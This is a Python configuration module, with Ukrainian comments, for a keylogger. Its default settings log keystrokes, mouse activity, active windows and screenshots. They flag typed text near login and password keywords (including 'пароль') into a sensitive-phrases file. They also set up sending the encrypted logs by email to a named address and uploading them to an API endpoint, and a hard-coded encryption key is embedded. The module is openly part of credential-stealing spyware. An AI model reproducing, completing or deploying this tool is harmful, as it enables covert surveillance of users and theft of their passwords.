import json
import os

config = {
    "log_special_keys": True,
    "stop_combination": ["Key.ctrl_l", "Key.shift", "q"]
}

def create_default_config():
    """Створює файл config.json із параметрами за замовчуванням, якщо його немає."""
    default_config = {
        "log_file": "keylog.txt",
        "log_special_keys": True,
        "log_combinations": True,
        "exclude_keys": ["Key.ctrl_l", "Key.alt_l"],
        "stop_combination": ["Key.ctrl_l", "Key.shift", "q"],
        "clear_combination": ["Key.ctrl_l", "Key.shift", "x"],
        "max_log_size": 1024 * 1024,  # Максимальний розмір логу (1 MB)
        "time_format": "%Y-%m-%d %H:%M:%S",
        "auto_stop_interval": 3600,  # Інтервал автоматичної зупинки в секундах
        "config_auto_update": True,
        "supported_languages": ["uk_UA", "en_US"],
        "encrypt_logs": True,
        "encryption_key": "WKIpN3XNsu0CVGW5mzHboXALT0fko2eNPvsGZJjWiTM=",
        "send_email": False,
        "email_interval": 3600,
        "email_settings": {
            "smtp_server": "smtp.example.com",
            "smtp_port": 587,
            "email_from": "logger@example.com",
            "email_to": "henec98203@exweme.com",
            "email_password": "password"
        },
        "app_filter": ["notepad.exe", "calc.exe"],
        "log_active_window": True,
        "log_language_change": True,
        "detect_suspicious_activity": True,
        "block_keyboard_on_suspicion": True,
        "suspicious_threshold": 5,
        "block_time": 10,
        "take_screenshot_on_event": True,
        "api_integration": True,
        "api_url": "https://example.com/api/upload",
        "log_mouse_activity": True,
        "phrase_assembly": True,  # Збирати фрази
        "login_keywords": ["login", "user", "username", "email"],
        "password_keywords": ["password", "pass", "pwd", "пароль"],
        "sensitive_phrases_log": "sensitive_phrases.txt"  # Файл для зберігання чутливих фраз
    }

    save_config(default_config)
    return default_config

def load_config():
    """Завантажує конфігурацію з файлу config.json або створює новий файл."""
    config_file = "config.json"
    if not os.path.exists(config_file):
        with open(config_file, 'w') as file:
            json.dump(config, file, indent=4)
            print("Файл config.json створено за замовчуванням.")
    else:
        with open(config_file, 'r') as file:
            config.update(json.load(file))
            print("Конфігурацію завантажено з config.json.")


def save_config(updated_config):
    """Зберігає оновлену конфігурацію у config.json."""
    config_file = 'config.json'
    with open(config_file, 'w') as file:
        json.dump(updated_config, file, indent=4)
    print("Конфігурацію оновлено та збережено у config.json.")
